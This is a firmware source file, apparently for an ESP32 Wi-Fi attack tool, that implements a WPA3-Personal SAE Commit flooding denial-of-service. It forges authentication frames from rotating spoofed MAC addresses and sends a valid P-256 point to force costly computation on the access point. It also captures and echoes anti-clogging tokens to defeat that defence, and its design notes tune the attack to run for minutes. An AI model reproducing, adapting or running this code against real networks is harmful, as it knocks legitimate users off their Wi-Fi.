// SAE Commit flooding (WPA3-Personal DoS).
//
// Design notes (why it is shaped this way):
//   * Authentication frame, algorithm 3 (SAE), transaction sequence 1 (Commit),
//     status 0, then the commit body: finite cyclic group (2 B LE), [anti-clogging
//     token if the AP asked for one and it is not H2E], scalar (prime length),
//     element (2x prime length for an ECC group). For group 19 (P-256) that is
//     32 B scalar + 64 B element.
//   * The commit element matters. Sending random bytes makes the AP reject at
//     point validation, which is cheap; sending a *valid* point (the P-256
//     generator, a public constant) makes it continue into the expensive part. The
//     module defaults to the generator and keeps `elem=rand` as the A/B control:
//     a cheaper AP answer for random bytes proves where the cost sits.
//   * Anti-clogging is a reflection test: the AP replies status 76 with a token
//     and does no work until the same station echoes it. hostapd writes the token
//     right after the group field (non-H2E) or as extended element 93 inside an
//     element 255 container (H2E); the token is stored per identity and echoed in
//     the same shape it arrived in, which is what actually buys the CPU burn.
//   * Identities (random MACs) rotate every few frames, because a token and its
//     state are per-station: rotating costs the AP a new SAE state each time.
//   * Spacing is enforced per frame instead of per tick: the driver's management
//     pool is shared and a burst is what makes it answer 0x101 (which restarts the
//     chip, see tx_guard.h).

#include "sae.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "deauth.h"
#include "ie_util.h"
#include "tx_guard.h"

namespace {

const uint8_t kSeqHigh = 0xF0;
const uint8_t kSeqLow = 0xFF;

const uint8_t kAuthAlgSae = 3;
const uint8_t kAuthSeqCommit = 1;
const uint16_t kGroupP256 = 19;
const uint16_t kStatusAntiClogging = 76;

// P-256 (secp256r1) generator, a public constant and a valid curve point.
const uint8_t kP256Generator[64] = {
    0x6B, 0x17, 0xD1, 0xF2, 0xE1, 0x2C, 0x42, 0x47, 0xF8, 0xBC, 0xE6, 0xE5, 0x63, 0xA4, 0x40, 0xF2,
    0x77, 0x03, 0x7D, 0x81, 0x2D, 0xEB, 0x33, 0xA0, 0xF4, 0xA1, 0x39, 0x45, 0xD8, 0x98, 0xC2, 0x96,
    0x4F, 0xE3, 0x42, 0xE2, 0xFE, 0x1A, 0x7F, 0x9B, 0x8E, 0xE7, 0xEB, 0x4A, 0x7C, 0x0F, 0x9E, 0x16,
    0x2B, 0xCE, 0x33, 0x57, 0x6B, 0x31, 0x5E, 0xCE, 0xCB, 0xB6, 0x40, 0x68, 0x37, 0xBF, 0x51, 0xF5,
};

const int kMaxIdentities = 8;
// Commits per identity before a fresh MAC is used (and the token state dropped).
const uint32_t kFramesPerIdentity = 4;
const int kMaxToken = 80;
// 50 ms between frames. Unicast frames that carry a forged transmitter address
// are retransmitted to the retry limit (~30 times) before the driver releases
// their buffer, so the pool drains at ~32 frames/s; 20 frames/s leaves 12
// frames/s of headroom and is what keeps a multi-minute run from hitting 0x101
// (see tx_guard.h for the measured curve). A smaller value is raised to this one.
const uint32_t kDefaultGapMs = 50;

bool s_active;
uint8_t s_bssid[6];
uint8_t s_channel;
sae_element_t s_element = SAE_ELEM_BASEPOINT;
uint32_t s_gap_ms = kDefaultGapMs;
uint32_t s_last_tx_ms;
sae_security_t s_security = SAE_SEC_UNKNOWN;

uint32_t s_frames;
uint32_t s_identities_total;
uint32_t s_responses;
uint16_t s_last_status;
uint32_t s_tokens;
uint32_t s_echoed;
uint32_t s_rng = 0x1234567u;

struct identity_t {
    uint8_t mac[6];
    uint8_t token[kMaxToken];
    uint16_t token_len;
    bool token_container;
    uint8_t sent;
};

identity_t s_ids[kMaxIdentities];
int s_id_count;
int s_id_cursor;

uint32_t next_rand(void) {
    s_rng ^= s_rng << 13;
    s_rng ^= s_rng >> 17;
    s_rng ^= s_rng << 5;
    return s_rng;
}

void random_local_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)(next_rand() & 0xFF);
    }
    mac[0] = (uint8_t)((mac[0] & 0xFC) | 0x02);  // locally administered, unicast
}

identity_t* current_identity(void) {
    if (s_id_count == 0 || s_ids[s_id_cursor].sent >= kFramesPerIdentity) {
        // Fresh station: append while there is room, then recycle the oldest slot
        // (a token and the SAE state behind it are per station, so a new MAC costs
        // the AP a whole new state machine).
        if (s_id_count < kMaxIdentities) {
            s_id_cursor = s_id_count;
            s_id_count++;
        } else {
            s_id_cursor = (s_id_cursor + 1) % kMaxIdentities;
        }
        identity_t* id = &s_ids[s_id_cursor];
        memset(id, 0, sizeof(*id));
        random_local_mac(id->mac);
        s_identities_total++;
        return id;
    }
    return &s_ids[s_id_cursor];
}

identity_t* find_identity(const uint8_t* mac) {
    for (int i = 0; i < s_id_count; i++) {
        if (memcmp(s_ids[i].mac, mac, 6) == 0) {
            return &s_ids[i];
        }
    }
    return nullptr;
}

// SAE Commit. Without a token this is the first frame of every identity; with a
// token it is the echo the AP is waiting for.
size_t build_commit(uint8_t* frame, const uint8_t sta[6], const identity_t* id) {
    memset(frame, 0, 192);
    frame[0] = 0xB0;  // management, subtype 11 = authentication
    frame[1] = 0x00;
    memcpy(frame + 4, s_bssid, 6);
    memcpy(frame + 10, sta, 6);
    memcpy(frame + 16, s_bssid, 6);
    frame[22] = kSeqHigh;
    frame[23] = kSeqLow;

    size_t n = 24;
    frame[n++] = kAuthAlgSae;
    frame[n++] = 0x00;
    frame[n++] = kAuthSeqCommit;  // transaction sequence 1 = Commit
    frame[n++] = 0x00;
    frame[n++] = 0x00;  // status 0
    frame[n++] = 0x00;
    frame[n++] = (uint8_t)(kGroupP256 & 0xFF);  // finite cyclic group 19 = P-256
    frame[n++] = (uint8_t)(kGroupP256 >> 8);

    const bool has_token = id != nullptr && id->token_len > 0;
    if (has_token && !id->token_container) {
        // Non-H2E: the token sits between the group and the scalar, raw.
        memcpy(frame + n, id->token, id->token_len);
        n += id->token_len;
    }
    for (int i = 0; i < 32; i++) {  // commit scalar
        frame[n++] = (uint8_t)(next_rand() & 0xFF);
    }
    if (s_element == SAE_ELEM_BASEPOINT) {
        memcpy(frame + n, kP256Generator, sizeof(kP256Generator));
    } else {
        for (int i = 0; i < 64; i++) {
            frame[n + i] = (uint8_t)(next_rand() & 0xFF);
        }
    }
    n += 64;

    if (has_token && id->token_container) {
        // H2E: token inside an Element 255 / Ext ID 93 container after the element.
        frame[n++] = 255;
        frame[n++] = (uint8_t)(1 + id->token_len);
        frame[n++] = 93;
        memcpy(frame + n, id->token, id->token_len);
        n += id->token_len;
    }
    return n;
}

// Parses the anti-clogging token out of a status-76 Authentication frame.
void store_token(identity_t* id, const uint8_t* body, uint16_t len) {
    if (id == nullptr || len < 3) {
        return;
    }
    if (body[0] == 255 && body[2] == 93) {
        const uint16_t token_len = (uint16_t)(body[1] - 1);
        if (token_len > 0 && token_len <= kMaxToken && 3 + token_len <= len) {
            memcpy(id->token, body + 3, token_len);
            id->token_len = token_len;
            id->token_container = true;
            s_tokens++;
        }
        return;
    }
    const uint16_t token_len = len > kMaxToken ? kMaxToken : len;
    memcpy(id->token, body, token_len);
    id->token_len = token_len;
    id->token_container = false;
    s_tokens++;
}

}  // namespace

sae_security_t sae_classify(const uint8_t* frame, uint16_t len) {
    if (frame == nullptr || len <= 36) {
        return SAE_SEC_UNKNOWN;
    }
    // Beacon / probe response: 24 B header + 12 B fixed parameters.
    const uint8_t* ies = frame + 36;
    const uint8_t* end = frame + len;
    uint16_t ie_len = 0;
    const uint8_t* rsn = ie_find(ies, end, 48, &ie_len);
    if (rsn == nullptr) {
        return SAE_SEC_UNKNOWN;  // open network: nothing to flood
    }
    const bool sae = rsn_has_akm_sae(rsn, ie_len);
    const bool psk = rsn_has_akm_psk(rsn, ie_len);
    if (sae && psk) {
        return SAE_SEC_TRANSITION;
    }
    if (sae) {
        return SAE_SEC_SAE;
    }
    if (psk) {
        return SAE_SEC_PSK;
    }
    return SAE_SEC_UNKNOWN;
}

const char* sae_security_name(sae_security_t sec) {
    switch (sec) {
        case SAE_SEC_PSK:
            return "wpa2-psk";
        case SAE_SEC_SAE:
            return "wpa3-sae";
        case SAE_SEC_TRANSITION:
            return "wpa2/wpa3";
        default:
            return "unknown";
    }
}

bool sae_start(int index, sae_element_t element, uint32_t gap_ms) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_bssid, bssid, 6);
    s_channel = WiFi.channel(index);
    s_element = element;
    s_gap_ms = gap_ms == 0 ? kDefaultGapMs : gap_ms;
    if (s_gap_ms < kDefaultGapMs) {
        // Never below the safe rate: the caller may ask for 5 ms, the radio would
        // answer 0x101 after ~60 frames and the chip would restart.
        s_gap_ms = kDefaultGapMs;
    }
    s_active = true;
    s_frames = 0;
    s_identities_total = 0;
    s_responses = 0;
    s_last_status = 0;
    s_tokens = 0;
    s_echoed = 0;
    s_security = SAE_SEC_UNKNOWN;
    s_id_count = 0;
    s_id_cursor = 0;
    s_last_tx_ms = millis() - s_gap_ms;

    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    // The sniffer is what turns the AP's status-76 answers into echoed commits.
    attack_sniffer_enable();
    return true;
}

void sae_stop(void) {
    s_active = false;
}

void sae_step(void) {
    if (!s_active) {
        return;
    }
    const uint32_t now = millis();
    if (now - s_last_tx_ms < s_gap_ms) {
        return;
    }
    s_last_tx_ms = now;

    if (s_id_count == 0) {
        current_identity();
    }
    identity_t* id = current_identity();
    uint8_t frame[192];
    const size_t len = build_commit(frame, id->mac, id);
    if (tx_guard_send(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        id->sent++;
        if (id->token_len > 0) {
            s_echoed++;
        }
    }
}

void sae_on_rx(const uint8_t* frame, uint16_t len, uint8_t type, uint8_t subtype) {
    if (len < 24) {
        return;
    }
    // Security of the target: beacons and probe responses, flooding or not.
    if (type == 0 && (subtype == 8 || subtype == 5) && memcmp(frame + 10, s_bssid, 6) == 0) {
        const sae_security_t sec = sae_classify(frame, len);
        if (sec != SAE_SEC_UNKNOWN) {
            s_security = sec;
        }
        return;
    }
    if (!s_active || type != 0 || subtype != 11 || len < 30) {
        return;
    }
    // Authentication from the AP to one of our identities?
    if (memcmp(frame + 10, s_bssid, 6) != 0) {
        return;
    }
    identity_t* id = find_identity(frame + 4);
    if (id == nullptr) {
        return;
    }
    if (frame[24] != kAuthAlgSae) {
        return;
    }
    const uint16_t status = (uint16_t)(frame[28] | (frame[29] << 8));
    s_responses++;
    s_last_status = status;
    if (status == kStatusAntiClogging) {
        store_token(id, frame + 30, (uint16_t)(len - 30));
    }
}

void sae_selftest(void) {
    static const uint8_t placeholder[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t fake_sta[6] = {0x02, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
    if (s_bssid[0] == 0 && s_bssid[1] == 0 && s_bssid[2] == 0) {
        memcpy(s_bssid, placeholder, 6);
    }

    uint8_t frame[192];
    const size_t len = build_commit(frame, fake_sta, nullptr);
    Serial.printf("SAETEST commit len=%u alg=%u seq=%u status=%u group=%u elem=%s\n",
                  (unsigned)len, (unsigned)(frame[24] | (frame[25] << 8)),
                  (unsigned)(frame[26] | (frame[27] << 8)),
                  (unsigned)(frame[28] | (frame[29] << 8)),
                  (unsigned)(frame[30] | (frame[31] << 8)),
                  s_element == SAE_ELEM_BASEPOINT ? "p256-generator" : "random");
    Serial.print("SAETEST commit hex=");
    for (size_t i = 0; i < len; i++) {
        Serial.printf("%02X", frame[i]);
    }
    Serial.println();

    // The token echo, in the H2E container shape hostapd uses for WPA3 R2.
    identity_t token_id;
    memset(&token_id, 0, sizeof(token_id));
    for (int i = 0; i < 8; i++) {
        token_id.token[i] = (uint8_t)(0xC0 + i);
    }
    token_id.token_len = 8;
    token_id.token_container = true;
    const size_t tlen = build_commit(frame, fake_sta, &token_id);
    Serial.printf("SAETEST commit+token len=%u token_eid=%u token_ext=%u token_len=%u\n",
                  (unsigned)tlen, (unsigned)frame[tlen - token_id.token_len - 3],
                  (unsigned)frame[tlen - token_id.token_len - 1],
                  (unsigned)frame[tlen - token_id.token_len - 2] - 1);
    Serial.printf("SAETEST security=%s\n", sae_security_name(s_security));
}

bool sae_active(void) {
    return s_active;
}

uint32_t sae_frames(void) {
    return s_frames;
}

uint32_t sae_identities(void) {
    return s_identities_total;
}

uint32_t sae_responses(void) {
    return s_responses;
}

uint16_t sae_last_status(void) {
    return s_last_status;
}

uint32_t sae_tokens(void) {
    return s_tokens;
}

uint32_t sae_echoed(void) {
    return s_echoed;
}

sae_security_t sae_security(void) {
    return s_security;
}

sae_element_t sae_element(void) {
    return s_element;
}

uint32_t sae_gap_ms(void) {
    return s_gap_ms;
}
